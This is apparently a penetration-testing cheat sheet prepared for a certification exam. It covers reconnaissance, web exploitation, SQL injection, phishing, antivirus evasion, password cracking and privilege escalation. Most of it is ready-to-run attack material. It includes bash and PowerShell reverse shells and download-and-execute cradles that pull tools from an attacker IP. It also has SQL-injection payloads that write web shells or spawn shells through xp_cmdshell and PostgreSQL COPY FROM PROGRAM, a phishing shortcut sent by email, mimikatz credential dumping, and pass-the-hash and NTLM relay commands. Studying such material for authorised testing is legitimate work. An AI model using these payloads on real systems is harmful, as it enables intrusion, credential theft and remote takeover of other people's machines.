**Information Gathering and Enumeration:**

**DNS Enumeration:**

`host www.target.domain`

`host -t txt,mx domain.com`

`dnsrecon -d megacorpone.com -t std`

`dnsrecon -d megacorpone.com -D list.txt -t brt`

`dnsenum megacorpone.com`

`nslookup mail2.megacorpone.com`

`nslookup -type=TXT info.megacorpone.com 8.8.8.8`

**TCP/UDP Port Scanning:**

`nc -nvv -w 1 -z 10.0.0.74 1-1000`

`nc -nv -u -z -w 1 10.0.0.74 1-1000`

`for ip in $(seq 100 200); do nc -nv -z -w 1 -u 192.168.45.44 $ip; done`

`sudo netdiscover -r 10.0.0.0/24`

`sudo nmap -v -sn 192.168.44.0-253 -oG sweep.txt`

`nmap --script-help http-headers`

`sudo nmap -p 445 --script=smb-enum-users 192.168.44.30 -Pn`

`sudo nmap -sV -sC -sU 192.168.44.30 -p 1-1000 -Pn | tee scan.txt`

`sudo masscan -p1-65535,U:1-65535 192.168.228.222 --rate=1000 -e tun0`

`Test-NetConnection -Port 445 192.168.45.33`

`1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.44.30", $_)) "TCP port $_ is open"} 2>$null` 

**no TTY shell:**
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell (am I running in cmd or PS?)
```
- am I running in PowerShell or cmd?

`python -c 'import pty; pty.spawn("/bin/bash")'`

**Common Reverse Shells**
```
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%27

IEX(New-Object System.Net.Webclient).DownloadString("http://<attacker-IP>/powercat.ps1");powercat -c <attacker-IP> -p 4444 -e powershell

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Miscellaneous**
```
PostgreSQL:
	- psql -h <target-IP> -p <target-port> -U <username>
	- \l					(list available databases)
	- \c database03				(connect to database03)
	- select * from cwd_user;               (retrieve password hashes)
```

**SMB Enumeration:**

`sudo nmap -v -p 139,445 -oG smb.txt 192.168.44.0/24`

`sudo nmap -v -p 139,445 --script=smb-os-discovery 192.168.44.30`

`net view \\\\DC01 /all`

`enum4linux -a 192.168.44.30`

`smbclient -L //192.168.44.30 -U anonymous`

`smbmap -H 192.168.44.30`

**SMTP Enumeration:**

`nc -nv 192.168.44.30 25`

`VRFY root`

`VRFY Administrator`

`Test-NetConnection -Port 25 192.168.44.30`

`dism /online /Enable-Feature /FeatureName:TelnetClient`

 `- grab the telnet client; client can also be transferred from the attacker`

`telnet 192.168.44.30 25`

**SNMP Enumeration:**

`sudo nmap -sU -p 161 --open -oG snmp_open.txt`

`sudo nmap --script-help=*snmp* 192.168.44.30`

`for ip in $(seq 1 254); do echo 192.168.44.\$ip; done > ips.txt`

`onesixtyone -c community -i ips.txt`

 - common community strings: public, private, manager

`snmpwalk -c public -v1 -t 10 192.168.44.30 -Oa` 

`snmpwalk -c public -v1 192.168.44.30 1.3.6.1.4.1.77.1.2.25`

 - enumerate Windows users based on the community string "public"

 - 1.3.6.1.2.1.25.6.3.1.2 for installed software

 - 1.3.6.1.2.1.6.13.1.3 for open TCP ports

 - 1.3.6.1.2.1.25.4.2.1.2 for running processes

**Vulnerability Scanning:**

`cat /usr/share/nmap/scripts/script.db | grep "\\"vuln\\""`

`sudo nmap -sV -p 443 --script "vuln" 192.168.44.30 (specifying a category)`

`sudo nmap --script-updatedb`

**Web Application Attacks:**

1. Enumerating Web Applications:
	
 	a. directories and files:

	`whatweb https://www.sait.ca`
	
	`nikto -h https://192.168.44.30:8090`

 	`dirb https://10.0.2.15:12380 /usr/share/wordlists/dirb/common.txt`
	
	`gobuster dir -u google.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

	`feroxbuster -u http://10.0.0.174:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404`

	`gobuster dir -u http://10.0.0.174 -x pdf,txt,php -w /usr/share/wordlists/dirb/common.txt`
	
	`ffuf -u https://arctic.htb:8500/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -t 100 -recursion -recursion-depth 3 -r -v`

	`gobuster dir -u "http://192.168.153.224:8000/" -x .txt,.php,.ini,.doc,.pptx,.pdf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`

	look in /sitemap.xml and /robots.txt for resources to examine
	check the output of the wappalyzer browser extension 
	
	b. subdomains (must be added to /etc/hosts):
	
  	`wfuzz -w subdomainWordlist.txt -u http://cmess.thm -H "HOST: FUZZ.cmess.thm"`

	`gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -d google.com`

	c. WordPress:
	
 	`wpscan --url https://10.0.2.15:12380/blogblog/ --enumerate vp,u,vt,tt --verbose --disable-tls-checks --detection-mode aggressive --api-token <token>`

	`wpscan --url http://192.168.250.244:80/ --enumerate ap,u,at,cb,tt --verbose --disable-tls-checks --detection-mode aggressive`

	`wpscan --url http://192.168.250.244:80/ --enumerate p --plugins-detection aggressive`

	`wpscan --url http://192.168.44.30:12380 --verbose`	

	d. API endpoints:
	
 	`gobuster dir -u http://192.168.44.30/ -w /usr/share/wordlists/dirb/big.txt -p pattern`

	 pattern: {GOBUSTER}/v1, {GOBUSTER}/v2, etc. separated by newlines

	`curl --proxy 127.0.0.1:8080 -i http://192.168.40.33/endpoint/v1`

	`gobuster dir -u http://192.168.40.33/endpoint/v1/user1 -w /usr/share/wordlists/dirb/small.txt`

	`curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.0.21:5001/users/v1/login`

	`curl -d '{"password":"lab","username":"offsec","email":"[pwn@offsec.com](mailto:pwn@offsec.com)","admin":"True"}' -H 'Content-Type: application/json' http://192.168.0.21:5001/users/v1/register`

	`curl -i <endpoint> -H 'Authorization: OAuth <token>'`

	e. parameters and submitted forms:

	`gospider -s "https://google.com" -t 10 -d 3 --sitemap --robots`

	`gospider -s "https://google.com" -t 10 -d 3 --sitemap --robots  | grep "\[form\]"`

3. XSS:
	
 	a. Enumeration:
	
 	Fuzz input fields with: `< > ' " { } ;`

	`<svg onload=alert('XSS')>`

   	`<img src=x onerror=alert(1) />`

	WordPress Core XSS can lead to new admin user + code execution

5. Directory/Path Traversal:
	
 	`curl --path-as-is http://example.com/cms/login.php?language=../../../../.etc/passwd`

	files to look for:
	
  	- /etc/passwd
	
  	- /etc/shadow
	
  	- /home/john/.ssh/id_ed25519, id_ecdsa, id_dsa, etc.
	
  	- C:\\Windows\\System32\\drivers\\etc\\hosts
	
  	- C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
	
  	- C:\\inetpub\\wwwroot\\web.config\\

6. File inclusions:
	
 	1. LFI: 
	
  		enumerate service and version for known file inclusion vulnerabilities

		enumerate parameters that take file names as input to include /etc/passwd or C:\\Windows\\System32\\drivers\\etc\\hosts (or index.php base64-encoded)

		try to provide `<?php echo system($_GET['cmd']); ?>` as input to the web application as a User-Agent or other field that will be logged and then exploit LFI to include the log file with ?cmd=ls appended to the end.

		use php wrappers to include arbitrary plain or base64 encoded PHP snippets or PHP files themselves as shown below.	

	2. RFI:
		
  		enumerate service and version for known remote file inclusion vulnerabilities

		`python3 -m http.server 80`

		`curl "http://mountaindesserts.com/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=ls"`

	3. PHP Wrappers:
		
  		1.`http://domain.com/index.php?page=php://filter/resource=localFile.php`
		
  		2.`http://domain.com/index.php?page=php://filter/convert.base64-encode/resource=localFile.php`
		
  		3.`http://domain.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>`
		
  		4. 
		
     			echo -n '<?php echo system($_GET["cmd"]);?>' | base64
		   
     			curl "http://domain.com/index.php?page=data://text/plain;base64,<base64-encoded-string-here>&cmd=ls"
		
  		5. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/backup.php`
		
  		6. `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"`

7. File Upload Vulnerabilities:
	
 	1. security check bypasses:
	
  		1. .PHP, .pHP
		
   			1. [A list of valid PHP extensions from fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt)
		
  		2. file.php%00
		
  		3. .txt.php
		
  		4. intercepting the request after submission and modifying the extension/changing the body, etc.
		
  		5. changing the file's magic number
		
  		6. if you can't upload executables, overwrite SSH keys
		
  		7. intercept the file and make it reference an instance of impacket-smbserver/ntlmrelayx to grab or relay the hash

8. Command Injection:
	
 	1. fuzz input fields with `& && ; |` \` 

**SQL Injection:**

	1. identify and fuzz all parameters taken by the application in both GET and POST requests

	2. Fuzzing:
		
  		2. `' OR 1=1-- .`
		
  		3. `' ORDER BY 1-- .`
		
  		4. `%' UNION SELECT database(), user(), @@version, null, null -- .`
		
  		5. `' AND 1=2-- .`
		
  		6. `' AND IF (1=1, sleep(3), 'false') -- .`

3. MySQL Basics:

 	1. `select version();`
	
 	2. `select system_user();`
	
 	3. `show databases;`
	
 	4. `SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';`

4. MS-SQL Basics:

 	1. `impacket-mssqlclient Administrator:Password1#@192.168.44.30 -windows-auth`
	
 	2. `SELECT @@version;`
	
 	3. `SELECT name FROM sys.databases;`
	
 	4. `SELECT * FROM <table-name>.information_schema.tables;`
	
 	5. `select * from sysusers;`
	
 	6. `SELECT * FROM <database-name>.dbo.<table-name>;`

5. Error-Based Payloads:

 	1. Fuzz with `' ; " -- .` appended to legitimate input
	
 	2. `username' OR 1=1-- .`
	
 	3. `username' OR 1=1 in (select @@version) -- .`
	
 	4. `username' OR 1=1 in (select * from users)-- .`
	
 	5. `username' OR 1=1 in (select password from users)-- .`
	
 	6. `username' OR 1=1 in (select password from users where username = 'admin')-- .`

6. UNION-based payloads:

 	1. `' ORDER BY 1-- .`      (try with 1,2,3,4,5,6 etc.; an error will be returned when the number surpasses the number of columns)
	
 	2. `%' UNION SELECT database(), user(), @@version, null, null -- .`
	
 	3. `' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns WHERE table_schema=database() -- .`        (tables and columns of the current database)
	
 	4. `' UNION SELECT null, username, password, description, null FROM users -- .`

7. Blind SQL injection payloads:

 	1. `http://domain.com/index.php?user=offsec' AND 1=1 -- .`            (boolean based)
	
 	2. `http://domain.com/index.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- .`         (time-based; this will sleep if the user exists and return false (no sleep) if the user does not exist)

8. SQLi to RCE:

 	1. MS-SQL (xp_cmdshell()):
	
  		1. `EXECUTE sp_configure 'show advanced options', 1;`
		
  		2. `RECONFIGURE;`
		
  		3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
		
  		4. `RECONFIGURE;`
		
  		5. `EXECUTE xp_cmdshell 'whoami';`
	
 	2. MySQL (SELECT INTO OUTFILE):
	
  		1. `username' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- .`          (number of columns must be exact; this payload can return an error even on success; payload must be written into an accessible directory)

9. Payloads used during practice:

 	1. MySQL SQLi to RCE:
	
  		1. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/test.php' FIELDS TERMINATED BY '<?php phpinfo();?>'; -- +`           (test writing to an accessible file)
		
  		2. `' UNION SELECT @,@,@,@,@; -- +`          (confirm number of columns)
		
  		3. `' UNION SELECT '', '', '', '', '', '' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET["cmd"]);?>'; -- +`          (write the webshell)
	
 	2. PostgreSQL blind time-based SQLi to RCE:
	
  		1. [RCE via PostgreSQLi](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
		
  		2. `weight=4&height=4'%3b+CREATE+TABLE+cmd_exec(cmd_output+text)%3b+--+%2b&age=2'&gender=Male'&email=test%40test.com'`             (create the table)
		
  		3. `weight=4&height=4'%3b+COPY+cmd_exec+FROM+PROGRAM+'wget+http%3a//192.168.45.204%3a8082/test.txt'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`            (try to pull down an arbitrary file from the attacker)
		
  		4. `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%30%34%2f%34%34%34%34%20%30%3e%26%31%22'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`          
		
   			1. (execute a bash reverse shell; the encoded snippet is: `bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"';--+`)
			
   			2. unencoded exploit: `weight=4&height=4';+COPY+cmd_exec+FROM+PROGRAM+'bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"'%3b--%2b&age=2'&gender=Male'&email=test%40test.com'`
	
 	3. MS-SQLi to RCE:
	
  		1. [MSSQL injection to RCE](https://medium.com/@alokkumar0200/owning-a-machine-using-xp-cmdshell-via-sql-injection-manual-approach-a380a5e2a340)
		
  		2. `test' UNION SELECT @@version, null;-- -`     
		
   			1. (correct number of columns will not return an error)
		
  		3. `test'; waitfor delay '0:0:10'-- -`             (enumerate time-based injection)
		
  		4. `admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+` 
		
  		5. `admin' UNION SELECT 1,2; RECONFIGURE--+`
		
  		6. `admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+`
		
  		7. `admin' UNION SELECT 1,2; RECONFIGURE--+`
		
  		8. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/test.txt'-- -`
		
  		9. `admin' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.204:8082/webshell.aspx c:\\inetpub\\wwwroot\webshell.aspx'-- -`

**Client Side Attacks:**

1. `gobuster dir -u "http://192.168.241.199/" -x .pdf,.docx,.pptx -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`

2. `exiftool -a -u filename.pdf`

3. [reverse shell macro to put into an office document](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/macro.vba)

4. [Windows library file/shortcut file](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/config.Library-ms):

 	1. `mkdir /home/kali/webdav/ && pip3 install wsgidav`
	
 	2. `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`
	
 	3. save the [Windows library file](https://github.com/ezra-fast/OSCPPrep/blob/master/ClientSideAttacks/config.Library-ms) as config.Library-ms
	
 	4. craft a shortcut file (shortcut.lnk) on Windows with the path being: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204:8082/powercat.ps1');powercat -c 192.168.45.204 -p 4444 -e powershell"`
	
 	5. serve the .lnk and .Library-ms files in `/home/kali/webdav`
	
 	6. serve [powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) on port 8082
	
 	7. `swaks --to Dave.Wizard@supermagicorg.com --from test@supermagicorg.com --auth-user test@supermagicorg.com --server supermagicorg.com --body 'Please open the attached file promptly.' --attach @/home/kali/webdav/config.Library-ms`


**Locating Public Exploits:**

1. `searchsploit -m windows/remote/34534.rb`

2. `searchsploit -p 34544`

3. `grep exploit /usr/share/nmap/scripts/*.nse`

4. `nmap --script-help=clamav-exec.nse`

5. lab 1:

 	1. `cewl -d 3 -w wordlist.txt --with-numbers -e http://10.0.0.174/`
	
 	2. `ffuf -request request.txt -request-proto http -w wordlist.txt:PASSFUZZ`         (PASSFUZZ is placed as parameter in request.txt)
	
 	3. `curl --data-urlencode "cmd=nc -e /bin/bash 192.168.45.204 4444" http://10.0.0.174/project/uploads/users/34535-backdoor.php`


**Fixing Public Exploits:**

1. `msfvenom --arch x86 -p windows/shell/reverse_tcp LPORT=4444 LHOST=192.168.45.204 -b "\x00\x0A\x0D\x25\x26\x2B\x3D" EXITFUNC=thread -f c -e x86/shikata_ga_nai`

2. `requests.post(url, data=data, allow_redirects=False, verify=False)`        (verify=False will allow you to overlook self signed certificates)


**Antivirus Evasion:**

1. [injecting shellcode into memory via powershell](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/ObfuscatedInMemoryInjection.ps1)

2. using shellter:

 	1. `sudo apt install wine && dpkg --add-architecture i386 && apt-get update && apt-get install wine32`
	
 	2. `shellter`

3. bypassing Avira with a batch file:

 	1. `impacket-smbserver -smb2support share .`
	
 	2. upload/send [BatchReverseShell.bat](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/BatchReverseShell.bat) to the victim
	
 	3. `nc -nvlp 4444`


**Brute Forcing:**

1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://10.0.0.174`

2. `hydra -L usernames.txt -p "Password1#" rdp://10.0.0.174`

3. brute forcing POST login forms with hydra:

 	1. grab authentication request body via Burp
	
 	2. identify the "condition string" (a string in the response to a failed authentication attempt that indicates failure)
	
 	3. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-post-form "/login.php:param1:^USER^&param2=^PASS^:Login failed. Invalid}"`
	
  		1. `"</form.php>:<parameters-and-their-significance>:<condition-string>"`

4. [brute forcing POST login forms with ffuf](https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login):

 	1. capture the authentication request using burp and save it as request.txt
	
 	2. replace parameters with USERFUZZ and PASSFUZZ as needed in request.txt
	
 	3. `ffuf -request request.txt -request-proto http -mode clusterbomb -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:USERFUZZ /usr/share/wordlists/rockyou.txt:PASSFUZZ -mc 200`
	
  		1. define status code 200 as successful login (`-mc 200`)

5. brute forcing basic HTTP authentication:

 	1. `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.174 http-get /`


**Password/Hash Cracking:**

- Methodology:

 	- 1. recover hash/protected material

  	- 2. convert data to crackable format using \*2john 

  	- 3. calculate cracking duration if needed

  	- 4. identify proper wordlist and craft a ruleset

  	- 5. run the cracking tool in a suitable environment (GPU for hashcat, CPU for john)

1. Hashcat rules:

 	1. `$3`       (append 3 to all words)
	
 	2. `^3`       (prepend 3 to all words)
	
 	3. `c`         (capitalize the first letter, lowercase the rest)
	
 	4. `hashcat -r demo.rule --stdout wordlist.txt`
	
 	5. `$1 $2 c`       (Password12)
	
  		1. rules are applied on a per-line bases; rules will be applied mutually exclusively unless specified on the same line
	
 	6. Common rules: `$1 c $!`      `$2 c $!`       `$1 $2 $3 c $!`
	
 	7. Common pre-made rules:
	
  		1. `/usr/share/hashcat/rules/rockyou-3000.rule`
		
  		2. `/usr/share/hashcat/rules/best64.rule`
	
 	8. `hashcat -m 1000 hash.ntlm /usr/share/wordlists/rockyou.txt -r rule.rule`

2. John rules:
```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
	1. append this to the bottom of /etc/john/john.conf
	2. john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules hash.ssh


3. `hash-id` and `hash-identifier` can be used to identify hash types

4. [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

5. `hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule`

6. `john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash`

7. extracting local Windows hashes:

 	1. `Get-LocalUser`
	
 	2. `.\Invoke-Mimikatz` or `Mimikatz.exe`
	
 	3. `privilege::debug`
	
 	4. `token::elevate`
	
 	5. `sekurlsa::logonpasswords`          (extract passwords and hashes)
	
 	6. `lsadump::sam`                                (dump NTLM hashes from SAM)
	
 	7. `hashcat -m 1000 hash.ntlm /usr/share/wordlist/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` 

8. Passing NTLM hashes:

 	1. Tools: `Mimikatz, crackmapexec, smbclient, impacket-*, WinRM, xfreerdp`
	
 	2. `smbclient //10.0.0.174/secrets -U Administrator --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c`
	
 	3. `impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.174`        (same syntax for wmiexec, smbexec)

9. Capturing and cracking Net-NTLMv2:

 	1. `sudo responder -I tun0 --analyze`              (listen for hashes without poisoning)
	
 	2. `dir \\192.168.45.204\share`                     (force an authentication from the victim)
	
 	3. `hashcat -m 5600 hash.netntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.txt`

10. relaying Net-NTLMv2 hashes:

 	1. `nc -nvlp 1337`
	
 	2. `impacket-ntlmrelayx --no-http-server -smb2support -t 10.0.0.174 -c "powershell -EncodedCommand <base64-encoded-PS>"`
	
 	3. `dir \\192.168.45.204\share`      (authenticate to the relay server from the victim)


**Windows Privilege Escalation:**

1. manual enumeration:

 	1. `whoami`
	
 	2. `whoami /groups`
	
 	3. `whoami /priv`
	
 	4. `powershell -c "Get-LocalUser"`
	
  		1. `net user`
	
 	5. `powershell -c "Get-LocalGroup"`
	
  		1. `net localgroup`
	
 	6. `powershell -c 'Get-LocalGroup "Domain Admins"'`
	
 	7. `systeminfo`
	
 	8. `ipconfig /all`
	
 	9. `route print`
	
 	10. `netstat -ano`
	
 	11. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`             (enumerate installed 32-bit applications)
	
 	12. `powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname"`         (enumerate installed 64-bit applications)
	
 	13. `dir C:\Program Files (x86)`
	
 	14. `dir C:\Program Files`
	
 	15. `powershell -c "Get-Process <process-name> | Format-List *"`         (enumerate running processes)
	
 	16. `Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue`                    (searching for user files)
	
 	17. `runas /user:Administrator cmd.exe`
	
 	18. `Get-History`
	
 	19. `(Get-PSReadlineOption).HistorySavePath`             (locate the PS history file)
	
 	20. `powershell -c "Get-ChildItem -Path C:\Users\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue"`      (enumerate for PS transcript file(s))
	
 	21. `evil-winrm -i 142.53.44.43 -u Administrator -p Password1#`
	
 	22. `Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational → Location of Script Block Logs`

2. automated enumeration for privilege escalation:

 	1. `. .\PowerUp.ps1; Invoke-AllChecks -Format HTML`
	
  		1. [List of individual PowerUp.ps1 commands](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
	
 	2. `.\Seatbelt.exe -group=all`
	
 	3. `Get-Content Output.txt | Select-String -Pattern "Installed Product" -Context 0, 60`                 (parse output files)

 	4. `. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended`

     	5. `.\winpeas.exe log=WINPEAS_MS01_OUTPUT.txt`

3. Windows Services for privilege escalation:

 	1. `services.msc, Get-Service, Get-CimInstance`

 	2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName`							(enumerate all services)

  	3. `sc qc DevService`														(query the service to find its binary path)
	
 	4. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}`            (enumerate running services)
	
 	5. `icacls "C:\xampp\apache\bin\httpd.exe"`            (enumerate service executable permissions)
	
 	6. replacing a service binary ('F' permissions on a service binary):            
	
  		1. (`Get-ModifiableServiceFile`  `Get-ModifiableService`)
		
  		2. `icacls <service-binary>`                 (should be F for current user or group)
		
  		3. `x86_64-w64-mingw32-gcc windows_service.c -o service.exe` 
		
   			1. `service.exe` must be the name of the service being replaced!
			
   			2. use the already written [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c)
		
  		4. `net stop TargetService`
		
   			1. access denied = enumerate Startup Type:
			
    				1. Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'TargetService'} (grab the Startup Type)
				
    				2. Startup Type = auto --> a reboot will restart it (SeShutdown is required)
				
    				3. shutdown /r /t 0
		
  		5. `net start TargetService`
		
  		6. `runas /user:added_user cmd.exe`
	
 	7. hijacking a (service's) required DLL:           (`Find-PathDLLHijack`)
	
  		1. `icacls TargetService.exe`        
		
   			1. (if 'F', replace the binary itself; if the service binary's directory is writable, attempt to hijack a required DLL)
		
  		2. copy the service binary to a local Windows machine for analysis via Procmon64.exe as Administrator:
		
   			1. Process Name is TargetService.exe
			
   			2. Result contains NOT FOUND
			
   			3. Path contains dll
		
  		3. `Restart-Service TargetService`             (DLL loading happens at conception)
  
       			1. sc create Scheduler binpath= "C:\Users\offsec\Scheduler.exe"
		
  		5. `x86_64-w64-mingw32-gcc malDll.cpp --shared -o RelyOnMe.dll`
		
   			1. the DLL must have the same name as the missing dependency
			
   			2. use this [malicious DLL](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_dll_2.cpp)
		
  		6. place the compiled DLL along the DLL search order
		
  		7. `Restart-Service TargetService`
	
 	8. unquoted service paths:                         (`Get-UnquotedService`)
	
  		1. vulnerability: spaces within the path to the service binary, no quotes around the path to the service binary, write permissions on one of the parent directories of the service binary's working directory
		
  		2. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName` (enumerate running and stopped services)
		
  		3. `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`         
		
   			1. (enumerate unquoted service paths for services outside the System32 directory; does not check for spaces in the binary paths)
		
  		4. Compile a [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c) with the name as the first word in a (writable) directory path with a space in it (ex: C:\Program Files\Enterprise.exe)
		
  		5. `Restart-Service TargetService`         (this may show an error on success)
	
 	9. abusing scheduled tasks:
	
  		1. `Get-ScheduledTask`
		
  		2. `schtasks /query /fo LIST /v`          (list scheduled tasks and their properties)
		
  		3. `schtasks /query /fo LIST /v | Select-String -Pattern "C:\\Users" -Context 10, 10`                   (scheduled tasks running out of Home directories)
		
  		4. `icacls job.exe`                    (check privileges on the task binary)
		
  		5. `x86_64-w64-mingw32-gcc exploit.c -o <action-name>`
		
   			1. `action-name` must be the same as the task action being replaced
			
   			2. [malicious binary](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/AddUser.c)
	
 	10. abusing user's assigned privileges:
	
  		1. look for:
		
   			1. `SeImpersonatePrivilege`
			
   			2. `SeBackupPrivilege`
			
   			3. `SeAssignPrimaryToken`
			
   			4. `SeLoadDriver`
			
   			5. `SeDebug`
		
  		2. SeImpersonatePrivilege:
		
   			1. [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
			
    				1. .\PrintSpoofer.exe -i -c powershell.exe
			
   			2. [GodPotato](https://github.com/BeichenDream/GodPotato)
			
    				1. .\GodPotato.exe -cmd "C:\Services\nc.exe -e cmd.exe 192.168.45.204 443"


**Linux Privilege Escalation:**

1. Manual Enumeration:

 	1. `id`
	
 	2. `cat /etc/passwd`
	
 	3. `hostname`
	
 	4. `cat /etc/issue && cat /etc/os-release && arch`
	
  		1. ex: `searchsploit "linux kernel Ubuntu 16 local privilege escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"`
	
 	5. `uname -a`
	
 	6. `ps aux`                                       (running processes in a readable format)
	
 	7. `ip a`
	
 	8. `route && routel`
	
 	9. `ss -anp`                              (list connections and their processes)
	
  		1. `netstat -anop`
	
 	10. `cat /etc/iptables/rules.v4`       (dump IPv4 rules)
	
  		1. `cat /etc/iptables | grep iptables-persistent`
		
  		2. `history | grep iptables-save`
		
  		3. `history | grep iptables-restore`
	
 	11. `ls -alh /etc/cron*`
	
 	12. `cat /etc/crontab`
	
 	13. `crontab -l`
	
 	14. `sudo crontab -l`
	
 	15. `grep "CRON" /var/log/syslog`                     (inspect the cron log file)
	
  		1. `cat /var/log/cron.log`
	
 	16. `dpkg -l`
	
 	17. `find / -writable -type d 2>/dev/null`
	
 	18. `find / -writable -type f 2>/dev/null`
	
 	19. `cat /etc/fstab`                     (list drives that will be mounted at boot time)
	
 	20. `mount`                                  (mounted filesystems)
	
 	21. `lslbk`                                  (available disks)
	
 	22. `lsmod`                                  (enumerate loaded kernel modules)
	
  		1. `/sbin/modinfo KernelModule`
	
 	23. `find / -perm -u=s type f 2>/dev/null`                  (SUID files)
	
 	24. `getcap -r / 2>/dev/null`                                          (capabilities; look for +ep)
	
 	25. `env`
	
 	26. `history && cat /home/<user>/.bash_history`
	
 	27. `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh -V`
	
 	28. `sudo -l`
	
 	29. `sudo -i`                                (run a shell as root with root env)
	
 	30. `su -`                                      (switch with new user's env)
	
 	31. `su root`                                (switch to root without switching env)
	
 	32. `sudo -s`                                (run as root without root env)
	
 	33. `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null`
	
 	34. `locate password | more`
	
